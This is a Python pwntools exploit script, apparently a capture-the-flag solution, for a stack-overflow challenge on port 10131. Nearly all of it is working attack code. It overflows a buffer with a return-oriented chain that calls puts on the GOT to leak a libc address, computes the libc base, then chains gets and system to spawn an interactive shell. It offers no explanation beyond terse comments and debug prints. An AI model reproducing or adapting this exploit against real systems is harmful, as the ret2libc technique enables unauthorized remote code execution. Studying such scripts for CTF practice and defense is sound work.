# at least need 33 bytes QAQ
import time

from pwn import *

def the_len():

    return int((time.time() - 1456113600) / 0x2710)

def get_payload_len():

    return cyclic(100).find(p32(0x66616161)) - 1

if __debug__:
#    r = remote("csie.ctf.tw", 10131)
    r = remote("127.0.0.1", 10131)
    libc = ELF('./libc.so.6-5c970fb93a8f7f9927e96057a860d06e')
    puts_plt = 0x8048410
    time_got = 0x804a014
    puts_got = 0x804a01c
    main = 0x80485e6
    ret = 0x8048667
else:
    r = remote("127.0.0.1", 10131)
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    puts_plt = 0x80483c0
    time_got = 0x804a014
    puts_got = 0x804a018
    main = 0x804855c
    ret = 0x80485c5


time_off = libc.symbols['time']
puts_off = libc.symbols['puts']
system_off = libc.symbols['system']
gets_off = libc.symbols['gets']

r.recvrepeat(0.5)
'''
raw_input()
r.send('\x00'*100 +
#        p32(0xdeadbeaf) +
#        p32(puts_got) +
        '\n'
)

print r.recvline()
temp = r.recvrepeat(0.5)
print temp
got_bin = temp[:4]
addr_actual = u32(got_bin)
print 'fuck'
print hex(u32(got_bin))
import sys
sys.exit(1)
'''
payload = ('\x00' * get_payload_len() +
            '\x00'  +
            p32(puts_plt) + # cover main()'s retaddr with puts_plt addr
#            p32(0xdeadbeef)  # the retaddr of puts
            p32(main) +
#            p32(time_got) # we want to leak the actual address of time, which is stored in time_got
            p32(puts_got) # we want to leak the actual address of time, which is stored in time_got
)
r.send(payload + '\n')
r.recvline() # trash
temp = r.recvrepeat(0.5)
got_bin = temp[:4]
print got_bin
addr_actual = u32(got_bin)
base = addr_actual - puts_off
print hex(base)
system = base + system_off
gets = base + gets_off
r.send( '\x00' + # wtf??????
        p32(ret) * (get_payload_len() / 4) +
        p32(gets) +
        p32(system) +
        p32(puts_got) +
        p32(puts_got) +
        '\n'
)
'''
r.send(p32(ret) * 20 +
        p32(gets) +
        p32(system) +
        p32(puts_got) +
        p32(puts_got) +
        '\n'
)
'''
#print r.recvrepeat(0.5)
r.send('sh\n')
r.interactive()
